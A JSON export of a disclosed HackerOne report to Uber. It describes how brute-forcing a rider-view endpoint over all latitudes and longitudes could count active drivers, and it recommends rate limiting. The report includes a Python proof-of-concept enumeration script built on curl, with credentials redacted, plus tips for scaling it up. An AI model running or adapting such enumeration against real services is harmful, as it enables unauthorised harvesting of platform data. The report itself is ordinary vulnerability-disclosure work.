{
  "id": 127025,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMjcwMjU=",
  "url": "https://hackerone.com/reports/127025",
  "title": "Brute Forcing rider-view Endpoint Allows for Counting Number of Active Uber Drivers",
  "state": "Closed",
  "substate": "informative",
  "readable_substate": "Informative",
  "created_at": "2016-03-31T01:08:37.450Z",
  "submitted_at": "2016-03-31T01:08:37.450Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "ddworken",
    "url": "/ddworken",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/017/344/0f539160a7134b9d14cd1f9c8e38bbc32c3b3604_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 314,
    "url": "https://hackerone.com/uber",
    "handle": "uber",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/000/314/24ea21370a71b18eafb5722d5855825ab622b5dd_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/314/24ea21370a71b18eafb5722d5855825ab622b5dd_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "Uber",
      "twitter_handle": "",
      "website": "https://www.uber.com",
      "about": ""
    }
  },
  "has_bounty?": false,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": true,
  "disclosed_at": "2016-06-13T22:24:22.010Z",
  "bug_reporter_agreed_on_going_public_at": "2016-04-01T00:33:18.895Z",
  "team_member_agreed_on_going_public_at": "2016-06-13T22:24:21.884Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "m.uber.com has an endpoint at ```https://m.uber.com/proxy-rt/product/city/rider-view``` that when called will return a list of nearby vehicles. By iterating through all latitudes and longitudes, it is possible to count the total number of active Uber drivers. \n\nThe full URL to be called is ```https://m.uber.com/proxy-rt/product/city/rider-view?is-ride-now=false&latitude=[INSERT HERE]&longitude=[INSERT HERE]```. I used Google Chrome's \"Copy as curl\" function to generate the following PoC code: \n\n``` python\nfor lat in range(-180,180):\n    for long in range(-180,180):\n        try: t = json.loads(check_output(\"\"\"curl 'https://m.uber.com/proxy-rt/product/city/rider-view?is-ride-now=false&latitude=\"\"\" + str(lat) + \"\"\"&longitude=\"\"\" + str(long) + \"\"\"' -H 'Cookie: logged_in=true; _LOCALE_=en_US; muber-id=[REDACTED]; version=[REDACTED]; browser_error=false; __zlcmid=ZvfRKEKucjdr2c; utag_main=v_id:[REDACTED]$_sn:9$_ss:0$_st:1459385284209$segment:a$userid:[REDACTED]$flowtype:P2P$_pn:6%3Bexp-session$ses_id:[REDACTED]%3Bexp-session; vehicle-view-id=326; token=[REDACTED]; new-version=[REDACTED]%0A; analytics-counter=65; analytics-session=%7B%22session_id%22%3A%227A84C14D-5FF6-[REDACTED]%22%2C%22session_start_time_ms%22%3A1459382073947%7D' -H 'X-Uber-Device-Language: en_US' -H 'DNT: 1' -H 'X-Uber-Token: [REDACTED]' -H 'X-Uber-Origin: m.uber.com' -H 'Accept-Encoding: gzip, deflate, sdch' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.110 Safari/537.36' -H 'Accept-Language: en-US,en;q=0.8' -H 'Accept: */*' -H 'X-Uber-Device: m.uber.com' -H 'Referer: https://m.uber.com/' -H 'X-Requested-With: XMLHttpRequest' -H 'Connection: keep-alive' -H 'X-Uber-Device-Id: m.uber.com' --compressed\"\"\", shell=True))['vehicleViewsOrder']\n        except: pass\n        list += t\nprint len(list(set(list)))\n``` \n\nI ran through 1/360th of the above code (total of 360 requests) in approximately 6 minutes. This code can quite easily be optimized in order to increase the speed and efficiency through: \n\n1. Checking only in areas where Uber is active\n2. Decreasing the size of the increment to ```.1``` instead of the current ```1``` to ensure we catch all Uber drivers\n\nIn order to patch this you have to add rate limiting to this end point. \n\nThanks,\nDavid Dworken",
  "weakness": {
    "id": 18,
    "name": "Information Disclosure"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": "2016-05-01T00:33:19.395Z",
  "allow_singular_disclosure_after": -245763102.93317217,
  "singular_disclosure_allowed": true,
  "vote_count": 1,
  "voters": [
    "dyabla"
  ],
  "structured_scope": null,
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
